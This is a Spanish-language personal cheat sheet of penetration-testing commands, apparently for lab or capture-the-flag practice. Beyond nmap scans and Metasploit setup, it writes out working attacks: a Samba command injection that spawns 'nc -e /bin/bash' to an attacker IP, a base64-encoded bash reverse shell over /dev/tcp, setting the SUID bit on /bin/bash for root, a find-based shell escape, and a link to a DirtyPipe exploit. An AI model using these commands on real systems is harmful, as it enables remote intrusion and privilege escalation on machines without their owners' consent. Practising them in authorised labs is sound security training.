# Comandos interesantes

## NMAP

Todos los puertos, rapido y silencioso
<pre>
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.168.193 -oG allPorts
</pre>
 
Puertos especificos
<pre>
nmap -sCV -p135,139,445,1688,3389,49152,49153,49154,49155,49156,49157 192.168.168.193 -oN targeted
</pre>

Puertos UDP, Los primeros 100
<pre>
nmap -sU -sCV -p1-100 192.168.168.193 -oN targetedUDP
</pre>

Especifico de vulnerabilidades sin intrusión
<pre>
nmap -p139,445 --script="Vuln and Safe" 192.168.168.193 -oN vulnScan 
</pre>

Enumeracion de directorios WEB básicos
<pre>
nmap --script http-enum -p80 10.10.10.180 -oN webScan
</pre>

## Netcap

Ponernos a la escucha:

<pre>
nc -nlvp 443
</pre>

Si es windows:

<pre>
rlwrap nc -nlvp 444
</pre>

Si es Linux podemos tunear la terminal recibida:

<pre>
script /dev/null -c bash
# CTLR + Z para poner en segundo plano la terminal
stty raw -echo; fg
reset xterm
export TERM=xterm
export shell=bash
stty rows 51 columns 189

</pre>

Si la consola nos da problemas con **script /dev/null -c bash** podemos prbar con python:

</pre>
python3 -c 'import pty;pty.spawn("/bin/bash")'
</pre>

## Samba
Listar recursos:
<pre>
smbclient -L 10.10.10.3 -N --option="client min protocol=NT1"
</pre>

Conectarnos a un recurso y ejecutar comando:
<pre>
smbclient //10.10.10.3/tmp -N --option="client min protocol=NT1" -c 'logon "/=`nohup nc -e /bin/bash 10.10.14.32 443`"'
</pre>

lo subimos por el ftp anonimo y a la escucha con:

<pre>
nc -nlvp 443
</pre>

Fijarse bien en la IP que conecta.


## Metasploit

### Iniciar la primera vez

Arrancamos servicio de base de datos
<pre>
sudo service postgresql start
</pre>

Inicamos bbdd de metasploit

<pre>
sudo msfdb init
</pre>

Despues como siempre

<pre>
msfconsole
</pre>

## MYSQL

Tener en cuanta la utilidad **mysqlshow** para enumerar.

<pre>
mysqlshow -uadmin -padmin
</pre>

Ejecutar sentencia inline:
<pre>
mysql -uadmin -padmin -c "select * from ..." dbname
</pre>

## PYTHON

### Permisos de superusuario con privilegios a la consola

<pre>
impor os;
os.system("chmod u+s /bin/bash")
</pre>

Y luego **bash -p**


## OTROS

Ver trazas icmp:

<pre>
sudo tcpdump -i tun0 icmp -n
</pre>



Nos mandamos consola:

<pre>
echo 'bash -i >& /dev/tcp/192.168.168.212/443 0>&1' | base64 

echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE2OC4yMTIvNDQzIDA+JjEK' | base64 -d | bash

</pre>

Para buscar ficheros con permisos suid

<pre>

find / -perm -u=s -type f 2>/dev/null
find \-perm -4000 2>/dev/null


</pre>

Permisos de superusuario a la consola:

<pre>
#!/bin/bash

chmod u+s /bin/bash
</pre>
Al tener pkexec utilizamos:

https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit


Si en la lista de pribilehios aparece **/usr/bin/find**

<pre>
/usr/bin/find . -exec /bin/sh -p \; -quit
</pre>

